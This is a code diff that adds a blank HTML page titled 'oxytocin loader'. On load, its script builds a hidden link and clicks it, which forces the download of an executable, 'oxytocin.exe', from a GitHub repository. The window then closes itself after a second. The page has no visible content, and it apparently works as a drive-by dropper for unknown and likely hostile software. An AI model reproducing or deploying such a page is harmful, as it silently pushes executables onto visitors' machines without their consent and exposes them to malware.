@@ -1,1 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>oxytocin loader</title>
+  <script>
+    window.onload = function() {
+      let link = document.createElement('a');
+      link.href = "https://github.com/ssrygmne3junjog/loader/raw/refs/heads/main/oxytocin.exe";
+      link.download = "oxytocin.exe";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
 
+      setTimeout(function() {
+        window.close();
+      }, 1000);
+    };
+  </script>
+</head>
+<body>
+</body>
+</html>
